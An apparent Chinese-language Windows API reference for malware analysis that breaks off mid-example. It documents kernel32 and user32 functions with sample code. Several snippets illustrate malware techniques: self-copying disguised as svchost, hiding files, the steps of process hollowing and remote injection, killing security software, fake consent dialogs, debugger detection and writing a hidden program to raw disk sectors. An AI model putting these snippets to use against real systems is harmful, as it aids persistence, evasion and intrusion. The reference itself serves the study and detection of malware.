| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hModule` | `HMODULE` | 目标模块句柄；传 `NULL` 获取当前可执行文件的路径。 |
| `lpFilename` | `LPSTR` | 输出缓冲区，接收完整路径。 |
| `nSize` | `DWORD` | 缓冲区字节数；缓冲区过小会截断，返回值为所需长度。 |

**返回值**：成功返回复制到缓冲区的字符数（不含 `\0`）；失败返回 `0`。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    char path[MAX_PATH] = {0};
    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (len) {
        printf("当前程序路径: %s\n", path);
    }
    return 0;
}
```

**运行结果示范**：
```text
当前程序路径: C:\Users\Public\sample.exe
```

**在病毒分析中的价值**：恶意程序常获取自身路径后配合 `CopyFileA`/`MoveFileA` 把**自己**复制/移动到启动目录实现持久化；样本若位于临时/下载目录却能自我复制到系统目录，是典型的自安装行为。

## CopyFileA（）：复制文件

把源文件完整复制成一个新文件（可保留属性）。

**函数原型**：
```c
BOOL CopyFileA(
  LPCSTR lpExistingFileName,            // 源文件路径
  LPCSTR lpNewFileName,                 // 目标文件路径
  BOOL   bFailIfExists                  // 目标已存在时是否失败
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpExistingFileName` | `LPCSTR` | 源文件路径。 |
| `lpNewFileName` | `LPCSTR` | 目标文件路径。 |
| `bFailIfExists` | `BOOL` | `TRUE`：目标存在则失败；`FALSE`：直接覆盖已存在的目标。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`，可通过 `GetLastError()` 获取错误码

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 把自身复制到启动目录，伪装成 svchost（bFailIfExists=FALSE 允许覆盖）
    if (CopyFileA("C:\\Users\\Public\\sample.exe",
                  "C:\\Users\\Public\\svchost.exe", FALSE)) {
        printf("复制成功\n");
    } else {
        printf("复制失败，错误码: %lu\n", GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
复制成功
```

**在病毒分析中的价值**：`CopyFileA` 是样本“落地/自我复制”的主要手段。观察目标路径是否在 `Startup`、`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 或 ProgramData，可判断其持久化策略。


## MoveFileExA（）：移动文件（支持延迟删除）

`MoveFile` 的增强版：支持覆盖、跨卷移动，以及“重启后删除/移动”。

**函数原型**：
```c
BOOL MoveFileExA(
  LPCSTR lpExistingFileName,            // 现有文件路径
  LPCSTR lpNewFileName,                 // 目标路径（可为 NULL）
  DWORD  dwFlags                        // 控制标志
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpExistingFileName` | `LPCSTR` | 源文件路径。 |
| `lpNewFileName` | `LPCSTR` | 目标路径。与 `MOVEFILE_DELAY_UNTIL_REBOOT` 组合时可传 `NULL`（表示只登记删除）。 |
| `dwFlags` | `DWORD` | 常用：`MOVEFILE_REPLACE_EXISTING`（覆盖同名文件）、`MOVEFILE_COPY_ALLOWED`（跨卷复制后删除）、`MOVEFILE_DELAY_UNTIL_REBOOT`（写入 `PendingFileRenameOperations`，重启后由系统删除）。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 清理被占用的病毒文件：登记重启后删除
    if (MoveFileExA("C:\\Windows\\Temp\\evil.dll", NULL, MOVEFILE_DELAY_UNTIL_REBOOT)) {
        printf("已登记重启后删除\n");
    }
    return 0;
}
```

**运行结果示范**：
```text
已登记重启后删除
```

**在病毒分析中的价值**：`MOVEFILE_DELAY_UNTIL_REBOOT` 会向注册表 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\PendingFileRenameOperations` 写值——分析该键即可发现“待重启删除/替换”的恶意文件清单。

## SetFileAttributesA（）：设置文件属性

设置文件的只读、隐藏、系统等属性。

**函数原型**：
```c
BOOL SetFileAttributesA(
  LPCSTR lpFileName,                    // 文件路径
  DWORD  dwFileAttributes               // 新的属性值
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpFileName` | `LPCSTR` | 目标文件路径。 |
| `dwFileAttributes` | `DWORD` | 属性标志，如 `FILE_ATTRIBUTE_HIDDEN`(隐藏)、`FILE_ATTRIBUTE_SYSTEM`(系统)、`FILE_ATTRIBUTE_READONLY`(只读)。设置时会整体覆盖原有属性。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 把落地文件设为“隐藏 + 系统”，使用户不易察觉
    if (SetFileAttributesA("C:\\Users\\Public\\cache.dat",
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
        printf("属性设置成功\n");
    }
    return 0;
}
```

**运行结果示范**：
```text
属性设置成功
```

**在病毒分析中的价值**：把载荷设为隐藏/系统属性、或把受害者的原始文件设为只读防删改，都是常见手法；同时也是沙箱/蜜罐“反隐藏”检测时重点扫描的属性组合。

## GetFileAttributesA（）：获取文件属性

读取文件或目录的属性（存在性、类型、隐藏标志等）。

**函数原型**：
```c
DWORD GetFileAttributesA(
  LPCSTR lpFileName                     // 文件/目录路径
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpFileName` | `LPCSTR` | 要查询的文件或目录路径。 |

**返回值**：
- **成功**：返回属性标志组合，如 `FILE_ATTRIBUTE_DIRECTORY`、`FILE_ATTRIBUTE_HIDDEN`
- **失败**：返回 `INVALID_FILE_ATTRIBUTES`（`0xFFFFFFFF`），可用 `GetLastError()` 看是否 `ERROR_FILE_NOT_FOUND`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD attr = GetFileAttributesA("C:\\Users\\Public");
    if (attr != INVALID_FILE_ATTRIBUTES) {
        if (attr & FILE_ATTRIBUTE_DIRECTORY) {
            printf("存在，且是目录\n");
        }
    } else {
        printf("路径不存在，错误码: %lu\n", GetLastError());
    }
    return 0;
}
```

**运行结果示范**：
```text
存在，且是目录
```

**在病毒分析中的价值**：恶意代码常用它探测路径是否存在（如判断沙箱目录、系统目录、是否已有标记文件），从而决定“感染与否/是否再次运行”。

## CreateProcessA（）：创建新进程

创建一个新进程及其主线程，可指定可执行文件与命令行。

**函数原型**：
```c
BOOL CreateProcessA(
  LPCSTR lpApplicationName,             // 可执行文件名（可 NULL）
  LPSTR  lpCommandLine,                 // 命令行
  LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程安全属性（NULL）
  LPSECURITY_ATTRIBUTES lpThreadAttributes,  // 线程安全属性（NULL）
  BOOL   bInheritHandles,               // 是否继承句柄
  DWORD  dwCreationFlags,               // 创建标志
  LPVOID lpEnvironment,                 // 环境块（NULL = 继承）
  LPCSTR lpCurrentDirectory,            // 工作目录（NULL）
  LPSTARTUPINFOA lpStartupInfo,         // 启动信息（须初始化）
  LPPROCESS_INFORMATION lpProcessInformation // 进程/线程信息（输出）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpApplicationName` | `LPCSTR` | 可执行文件路径；也可为 `NULL`，此时从 `lpCommandLine` 解析第一个词为程序。 |
| `lpCommandLine` | `LPSTR` | 命令行参数（注意参数需用空格分隔、路径用引号包裹）。 |
| `bInheritHandles` | `BOOL` | 新进程是否继承父进程可继承句柄，通常 `FALSE`。 |
| `dwCreationFlags` | `DWORD` | `0` 正常运行；`CREATE_SUSPENDED`(挂起主线程)、`CREATE_NO_WINDOW`(无窗口)、`DEBUG_PROCESS`(调试被创建进程) 等。 |
| `lpProcessInformation` | `LPPROCESS_INFORMATION` | 输出结构，含新进程/主线程句柄与 PID，使用后需 `CloseHandle`。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // 挂起方式启动 cmd（进程镂空/调试场景常用）
    BOOL ok = CreateProcessA(NULL, "cmd.exe",
                             NULL, NULL, FALSE,
                             CREATE_SUSPENDED | CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);
    if (ok) {
        printf("已创建进程 PID=%lu (主线程挂起)\n", pi.dwProcessId);
        // 这里可对 pi.hProcess 做 WriteProcessMemory 等
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    return 0;
}
```

**运行结果示范**：
```text
已创建进程 PID=5720 (主线程挂起)
```

**在病毒分析中的价值**：`CreateProcessA` + `CREATE_SUSPENDED` 是“进程镂空”（Process Hollowing）的第一步——先挂起创建合法进程（如 `svchost.exe`），再 `WriteProcessMemory` 覆写其内存后恢复线程执行恶意代码。分析时注意其目标程序与后续内存写入。


## CreateThread（）：创建新线程

在当前进程内创建一个线程并开始执行指定函数。

**函数原型**：
```c
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES  lpThreadAttributes, // 线程安全属性（NULL）
  SIZE_T                 dwStackSize,        // 栈大小（0 = 默认）
  LPTHREAD_START_ROUTINE lpStartAddress,     // 线程入口函数
  LPVOID                 lpParameter,        // 传给入口的参数
  DWORD                  dwCreationFlags,    // 创建标志
  LPDWORD                lpThreadId          // 接收线程 ID（可 NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpStartAddress` | `LPTHREAD_START_ROUTINE` | 线程入口，即线程开始执行的函数指针。 |
| `lpParameter` | `LPVOID` | 传给入口函数的参数。 |
| `dwCreationFlags` | `DWORD` | `0` 立即运行；`CREATE_SUSPENDED` 先挂起。 |
| `lpThreadId` | `LPDWORD` | 可选，接收线程 ID。 |

**返回值**：
- **成功**：返回线程句柄（用完后 `CloseHandle`）
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

DWORD WINAPI Worker(LPVOID param) {
    printf("线程运行中，参数=%lu\n", (DWORD)(ULONG_PTR)param);
    return 0;
}

int main() {
    HANDLE hThread = CreateThread(NULL, 0, Worker, (LPVOID)42, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);   // 等待线程结束
        CloseHandle(hThread);
    }
    return 0;
}
```

**运行结果示范**：
```text
线程运行中，参数=42
```

**在病毒分析中的价值**：恶意代码把解码/加密后的数据**直接作为线程入口**运行（就地执行 shellcode），或在主逻辑里开多个线程分工（下载+加密+弹窗）。断点在 `CreateThread` 的 `lpStartAddress` 即可定位真正的执行载荷。

## VirtualAllocEx（）：在其他进程中分配内存

在指定进程的地址空间内分配虚拟内存（跨进程注入的“先手”）。

**函数原型**：
```c
LPVOID VirtualAllocEx(
  HANDLE hProcess,                      // 目标进程句柄
  LPVOID lpAddress,                     // 期望地址（NULL）
  SIZE_T dwSize,                        // 分配大小
  DWORD  flAllocationType,              // MEM_COMMIT | MEM_RESERVE
  DWORD  flProtect                      // 保护属性
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hProcess` | `HANDLE` | 目标进程句柄（`OpenProcess` 获得），需 `PROCESS_VM_OPERATION` 权限。 |
| `dwSize` | `SIZE_T` | 分配的字节数。 |
| `flAllocationType` | `DWORD` | 类型标志，常用 `MEM_COMMIT \| MEM_RESERVE`。 |
| `flProtect` | `DWORD` | 保护属性，如 `PAGE_EXECUTE_READWRITE`、`PAGE_READWRITE`。 |

**返回值**：
- **成功**：返回目标进程内分配的地址
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1024);
    if (!hProc) return 1;

    // 在目标进程里分配一块可读写可执行内存，用于写入 shellcode
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, 4096,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemote) {
        printf("目标进程内分配成功: %p\n", pRemote);
        // 下一步通常 WriteProcessMemory + CreateRemoteThread
    }
    CloseHandle(hProc);
    return 0;
}
```

**运行结果示范**：
```text
目标进程内分配成功: 0x000002D3A4C30000
```

**在病毒分析中的价值**：`VirtualAllocEx` 出现的下一跳几乎必然是 `WriteProcessMemory`（写入载荷）与 `CreateRemoteThread`/`SetThreadContext`（执行）。三件套齐备即远程注入，分析时把三个调用点连起来看就能还原完整注入链。

## TerminateProcess（）：终止进程

强制结束一个进程（不执行其清理代码）。

**函数原型**：
```c
BOOL TerminateProcess(
  HANDLE hProcess,                      // 目标进程句柄
  UINT   uExitCode                      // 退出码
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hProcess` | `HANDLE` | 要终止的进程句柄（`OpenProcess` 获得，或 `GetCurrentProcess` 终止自身）。 |
| `uExitCode` | `UINT` | 赋给进程的退出码。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 终止 PID 为 4455 的进程（如安全软件）
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, 4455);
    if (hProc) {
        if (TerminateProcess(hProc, 1)) printf("进程已终止\n");
        CloseHandle(hProc);
    }
    return 0;
}
```

**运行结果示范**：
```text
进程已终止
```

**在病毒分析中的价值**：恶意程序常 `TerminateProcess` 结束杀软/EDR/沙箱进程，或终止自身旧实例（互斥）。对安全软件的终止调用是无害程序通常不会出现的强信号。

## ExitProcess（）：结束当前进程

正常结束当前进程并返回退出码。

**函数原型**：
```c
void ExitProcess(
  UINT uExitCode                        // 退出码
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `uExitCode` | `UINT` | 进程退出码。 |

**返回值**：无返回值（不返回）。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 执行完载荷后立即退出，不留多余窗口
    printf("任务完成，退出\n");
    ExitProcess(0);
    return 0;   // 不会执行到
}
```

**运行结果示范**：
```text
任务完成，退出
```

**在病毒分析中的价值**：样本主逻辑结束后调用 `ExitProcess` 的地方可视为“代码终点”，帮助划定需要分析的关键调用范围；木马在自删除（`DeleteFile` 后）也常立即退出。

## Sleep（）：休眠指定毫秒

使当前线程挂起指定的毫秒数。

**函数原型**：
```c
void Sleep(
  DWORD dwMilliseconds                  // 休眠毫秒数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `dwMilliseconds` | 休眠时长（毫秒）。传 `0` 让出当前时间片但不休眠；`INFINITE` 表示永久等待。 |

**返回值**：无返回值。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    printf("等待 3 秒…\n");
    Sleep(3000);
    printf("继续执行\n");
    return 0;
}
```

**运行结果示范**：
```text
等待 3 秒…
继续执行
```

**在病毒分析中的价值**：恶意代码常用长时间 `Sleep`（数十分钟到数小时）躲避沙箱的“短时动态分析”，或作为 C2 心跳间隔。看到超大毫秒参数（如 `Sleep(600000)`）基本可判定为反沙箱/慢速信标。

## GetTickCount（）：获取系统运行时间

返回系统自启动以来经过的毫秒数（32 位，约 49.7 天后回绕）。

**函数原型**：
```c
DWORD GetTickCount(void);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| （无参数） | 返回自系统启动以来的毫秒数。 |

**返回值**：返回 `DWORD` 毫秒值。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD t0 = GetTickCount();
    Sleep(1000);
    DWORD elapsed = GetTickCount() - t0;   // 无符号差值，自动处理回绕
    printf("实际经过: %lu ms\n", elapsed);
    return 0;
}
```

**运行结果示范**：
```text
实际经过: 1002 ms
```

**在病毒分析中的价值**：恶意代码先取 `GetTickCount`、`Sleep` 一段再取一次并比较时间差，若“感觉太快/几乎没耗时”即判定运行在虚拟化/加速环境中并终止（反沙箱计时探测）。配合 `rdtsc`、`QueryPerformanceCounter` 都是同类手法。


## SetFilePointerEx（）：按 64 位偏移移动文件指针

把文件句柄的读写位置移动到指定偏移（支持 64 位大偏移，是“按扇区寻址”的基础）。

**函数原型**：
```c
BOOL SetFilePointerEx(
  HANDLE         hFile,                 // 文件/设备句柄
  LARGE_INTEGER  liDistanceToMove,      // 要移动的偏移量（有符号 64 位）
  PLARGE_INTEGER lpNewFilePointer,      // 输出：移动后的位置（可 NULL）
  DWORD          dwMoveMethod           // 基准：FILE_BEGIN/CURRENT/END
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hFile` | `HANDLE` | 文件句柄。对原始磁盘访问，是 `CreateFile("\\\\.\\C:")` 返回的设备句柄。 |
| `liDistanceToMove` | `LARGE_INTEGER` | 移动字节数。**访问第 N 扇区时传 `N * 每扇区字节数`**（用 `LARGE_INTEGER` 存 64 位乘积）。 |
| `dwMoveMethod` | `DWORD` | `FILE_BEGIN`(从文件头)、`FILE_CURRENT`、`FILE_END`。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 以原始方式打开整个 C 卷（可绕过文件系统直接读扇区）
    HANDLE hVol = CreateFileA("\\\\.\\C:",
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hVol == INVALID_HANDLE_VALUE) { printf("打开卷失败\n"); return 1; }

    LARGE_INTEGER pos;
    pos.QuadPart = 0;                     // 第 0 扇区 = 引导扇区/分区表
    BYTE sector[512];
    DWORD rd = 0;

    if (SetFilePointerEx(hVol, pos, NULL, FILE_BEGIN) &&
        ReadFile(hVol, sector, 512, &rd, NULL)) {
        printf("读取引导扇区 %lu 字节 (前两字节: %02X%02X)\n",
               rd, sector[0], sector[1]); // FAT 卷首通常 EB 58 / 55 AA 结尾
    }
    CloseHandle(hVol);
    return 0;
}
```

**运行结果示范**：
```text
读取引导扇区 512 字节 (前两字节: EB58)
```

**在该 FAT32 项目中的用途**：读写“三不管”空间与目录表都必须精确按扇区寻址。`SetFilePointerEx(扇区号 * 512)` 后再 `ReadFile`/`WriteFile`，即可在保留原文件系统数据的同时，向隐藏扇区写入程序或读回目录项。

## GetFileSizeEx（）：获取文件/卷大小

以 64 位整数返回文件或设备的大小（原始卷访问时即卷总字节数）。

**函数原型**：
```c
BOOL GetFileSizeEx(
  HANDLE         hFile,                 // 文件/设备句柄
  PLARGE_INTEGER lpFileSize             // 输出：总字节数
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hFile` | `HANDLE` | 文件或设备句柄。 |
| `lpFileSize` | `PLARGE_INTEGER` | 输出总大小（64 位）。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hVol = CreateFileA("\\\\.\\C:", 0,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    LARGE_INTEGER sz;
    if (GetFileSizeEx(hVol, &sz)) {
        printf("C 卷大小: %llu 字节 = %.1f GB\n",
               sz.QuadPart, sz.QuadPart / 1073741824.0);
    }
    CloseHandle(hVol);
    return 0;
}
```

**运行结果示范**：
```text
C 卷大小: 536870912000 字节 = 500.0 GB
```

**在该 FAT32 项目中的用途**：先算总扇区数（`大小 ÷ 每扇区字节`）即可界定“三不管”空间的可用边界，防止写入越界破坏分区表/后续分区。

## DeviceIoControl（）：向设备发送控制码

对设备句柄执行 I/O 控制操作——**锁定/解锁卷**、获取磁盘几何参数等底层动作都走这里。

**函数原型**：
```c
BOOL DeviceIoControl(
  HANDLE hDevice,                       // 设备/卷句柄
  DWORD  dwIoControlCode,               // 控制码
  LPVOID lpInBuffer,                    // 输入缓冲区（按控制码）
  DWORD  nInBufferSize,                 // 输入长度
  LPVOID lpOutBuffer,                   // 输出缓冲区
  DWORD  nOutBufferSize,                // 输出长度
  LPDWORD lpBytesReturned,              // 输出：返回字节数
  LPOVERLAPPED lpOverlapped             // 异步结构（NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hDevice` | `HANDLE` | 设备/卷句柄（`CreateFile` 以 `GENERIC_READ\|GENERIC_WRITE` 打开卷）。 |
| `dwIoControlCode` | `DWORD` | 常用：`FSCTL_LOCK_VOLUME`(`0x90018`，锁定独占)、`FSCTL_UNLOCK_VOLUME`(`0x9001C`)、`IOCTL_DISK_GET_DRIVE_GEOMETRY`(`0x70000`，得几何参数)。 |
| `lpInBuffer` / `lpOutBuffer` | `LPVOID` | 输入/输出缓冲；几何信息输出到 `DISK_GEOMETRY` 结构。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`（需管理员权限）

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 打开卷并加锁（原始扇区写前必须先锁，避免文件系统并发写坏数据）
    HANDLE hVol = CreateFileA("\\\\.\\C:",
        GENERIC_READ | GENERIC_WRITE, 0,   // 独占打开
        NULL, OPEN_EXISTING, 0, NULL);

    DWORD ret = 0;
    if (DeviceIoControl(hVol, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &ret, NULL)) {
        printf("卷已锁定，可安全改写扇区\n");
        // ……SetFilePointerEx + WriteFile……
        DeviceIoControl(hVol, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &ret, NULL);
        printf("卷已解锁\n");
    } else {
        printf("锁定失败（需要管理员权限）\n");
    }
    CloseHandle(hVol);
    return 0;
}
```

**运行结果示范**：
```text
卷已锁定，可安全改写扇区
卷已解锁
```

**在该 FAT32 项目中的用途**：① `FSCTL_LOCK_VOLUME` 保证改写目录表/隐藏扇区时不会被系统占用；② `IOCTL_DISK_GET_DRIVE_GEOMETRY` 读出每扇区字节数与总扇区数，用于解析 BPB、计算“三不管”边界。注意这些调用要求**管理员权限**。

## FlushFileBuffers（）：把缓冲数据刷到磁盘

强制把句柄的写缓冲立即写回物理磁盘（原始扇区写后必须调用，否则可能只停留在缓存）。

**函数原型**：
```c
BOOL FlushFileBuffers(
  HANDLE hFile                          // 文件/设备句柄
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `hFile` | 已打开用于写入的文件/卷句柄。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 假设已改写某扇区
    HANDLE hVol = /* CreateFile("\\\\.\\C:", ...) */ INVALID_HANDLE_VALUE;
    // WriteFile(hVol, sector, 512, &wr, NULL);
    if (FlushFileBuffers(hVol)) {
        printf("数据已写入物理磁盘\n");
    }
    return 0;
}
```

**运行结果示范**：
```text
数据已写入物理磁盘
```

**在该 FAT32 项目中的用途**：写隐藏程序或目录表后立即 `FlushFileBuffers`，保证断电/拔盘前数据真实落盘（三不管空间在缓存不命中时最容易“写丢”）。

## GetDriveTypeA（）：获取驱动器类型

判断根路径对应的是固定磁盘、可移动磁盘还是光驱等，避免对错误的设备做底层操作。

**函数原型**：
```c
UINT GetDriveTypeA(
  LPCSTR lpRootPathName                 // 根路径，如 "C:\\"
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `lpRootPathName` | 盘符根路径，如 `"C:\\"`。 |

**返回值**：返回类型：`DRIVE_FIXED`(固定磁盘)、`DRIVE_REMOVABLE`(U 盘)、`DRIVE_CDROM`(光驱)、`DRIVE_UNKNOWN` 等。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    UINT t = GetDriveTypeA("C:\\");
    switch (t) {
        case DRIVE_FIXED:    printf("C: 固定磁盘\n"); break;
        case DRIVE_REMOVABLE: printf("C: 可移动磁盘\n"); break;
        default:             printf("C: 其他类型 (%u)\n", t);
    }
    return 0;
}
```

**运行结果示范**：
```text
C: 固定磁盘
```

**在该 FAT32 项目中的用途**：用它在多盘符环境里自动挑出 FAT32 固定/U 盘卷（配合 `GetVolumeInformationA` 验证文件系统），防止对光驱/网络盘执行会报错的扇区写操作。

## GetVolumeInformationA（）：获取卷信息

读取卷的文件系统名、卷标、序列号与能力标志（判断是否为 FAT32 的关键）。

**函数原型**：
```c
BOOL GetVolumeInformationA(
  LPCSTR lpRootPathName,                // 根路径
  LPSTR  lpVolumeNameBuffer,            // 卷标输出（可 NULL）
  DWORD  nVolumeNameSize,               // 卷标缓冲区大小
  LPDWORD lpVolumeSerialNumber,         // 序列号输出（可 NULL）
  LPDWORD lpMaximumComponentLength,     // 文件名最大长度（可 NULL）
  LPDWORD lpFileSystemFlags,            // 文件系统标志（可 NULL）
  LPSTR  lpFileSystemNameBuffer,        // 文件系统名输出（可 NULL）
  DWORD  nFileSystemNameSize            // 文件系统名缓冲区大小
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpRootPathName` | `LPCSTR` | 根路径，如 `"C:\\"`。 |
| `lpFileSystemNameBuffer` | `LPSTR` | 输出文件系统名，如 `"FAT32"`、`"NTFS"`。 |
| `lpFileSystemFlags` | `LPDWORD` | 输出能力标志，如 `FILE_READ_ONLY_VOLUME`、`FILE_SUPPORTS_HARD_LINKS`。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    char fs[16] = {0};
    if (GetVolumeInformationA("C:\\", NULL, 0, NULL, NULL, NULL, fs, sizeof(fs))) {
        if (_stricmp(fs, "FAT32") == 0) {
            printf("确认是 FAT32 卷，可按 FAT 结构解析 BPB/目录\n");
        } else {
            printf("文件系统: %s（非 FAT32）\n", fs);
        }
    }
    return 0;
}
```

**运行结果示范**：
```text
确认是 FAT32 卷，可按 FAT 结构解析 BPB/目录
```

**在该 FAT32 项目中的用途**：解析 BPB、FAT 表、目录项前先确认确实是 FAT32（32 位扇区/簇偏移），再按 BPB 里 `每扇区字节数`、`每簇扇区数`、`FAT 表起始扇区` 等字段计算——避免按错误布局读写导致分区损坏。


# Windows API (user32.dll)

user32.dll 提供 **GUI 与用户交互**功能：窗口创建与管理、消息框、键盘鼠标输入、系统钩子等。恶意代码分析中常涉及**勒索弹窗、盗号/键盘记录（Keylogger）、反调试窗口探测、钓鱼伪装**等。

## MessageBoxA（）：弹出消息框

在屏幕上显示带按钮的对话框，等待用户点击后返回所按按钮。

**函数原型**：
```c
int MessageBoxA(
  HWND   hWnd,                          // 父窗口句柄（NULL = 无）
  LPCSTR lpText,                        // 消息正文
  LPCSTR lpCaption,                     // 标题栏文字
  UINT   uType                          // 按钮/图标样式
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hWnd` | `HWND` | 拥有该消息框的窗口；`NULL` 表示无所有者。 |
| `lpText` | `LPCSTR` | 消息框显示的内容。 |
| `lpCaption` | `LPCSTR` | 标题栏文字。 |
| `uType` | `UINT` | 按钮与图标组合，如 `MB_OK`、`MB_YESNO`、`MB_ICONWARNING`、`MB_ICONERROR`。 |

**返回值**：返回用户点击的按钮 ID，如 `IDOK`(1)、`IDYES`(6)、`IDNO`(7)。

**使用示范**：
```c
#include <windows.h>

int main() {
    int r = MessageBoxA(NULL,
        "系统更新：是否允许本程序修改系统设置？",
        "提示", MB_YESNO | MB_ICONWARNING);
    if (r == IDYES) {
        // 用户授权后执行恶意逻辑……
    }
    return 0;
}
```

**在病毒分析中的价值**：勒索软件用仿冒对话框诱导用户授权（UAC 钓鱼）；分析时 `lpText`/`lpCaption` 字符串即社工话术，常含可搜索的样本特征。

## FindWindowA（）：查找窗口

按类名/窗口标题查找顶层窗口，返回窗口句柄。

**函数原型**：
```c
HWND FindWindowA(
  LPCSTR lpClassName,                   // 窗口类名（可 NULL）
  LPCSTR lpWindowName                   // 窗口标题（可 NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpClassName` | `LPCSTR` | 窗口类名，如 `"ConsoleWindowClass"`。可传 `NULL` 只按标题查。 |
| `lpWindowName` | `LPCSTR` | 窗口标题文本。 |

**返回值**：
- **找到**：返回窗口句柄（`HWND`）
- **未找到**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 探测是否运行着调试/分析工具（如 OllyDbg 主窗口）
    HWND h = FindWindowA(NULL, "OllyDbg");
    if (h) printf("检测到 OllyDbg！\n");
    return 0;
}
```

**运行结果示范**：
```text
检测到 OllyDbg！
```

**在病毒分析中的价值**：恶意代码用 `FindWindowA` 查找杀软/调试器/沙箱的窗口标题（如 `Process Hacker`、`Wireshark`）实现**反分析**；用类名查找自身控制窗口避免多开。窗口标题字符串可直接作为检测特征。

## GetWindowTextA（）：获取窗口标题/文本

把窗口的标题栏文本（或控件文本）复制到缓冲区。

**函数原型**：
```c
int GetWindowTextA(
  HWND  hWnd,                           // 目标窗口句柄
  LPSTR lpString,                       // 接收文本的缓冲区
  int   nMaxCount                       // 最大字符数
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hWnd` | `HWND` | 要读取的窗口句柄。 |
| `lpString` | `LPSTR` | 输出缓冲区。 |
| `nMaxCount` | `int` | 最多复制 `nMaxCount-1` 个字符。 |

**返回值**：返回复制的字符数（不含 `\0`）。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HWND h = FindWindowA(NULL, "记事本");
    if (h) {
        char title[256] = {0};
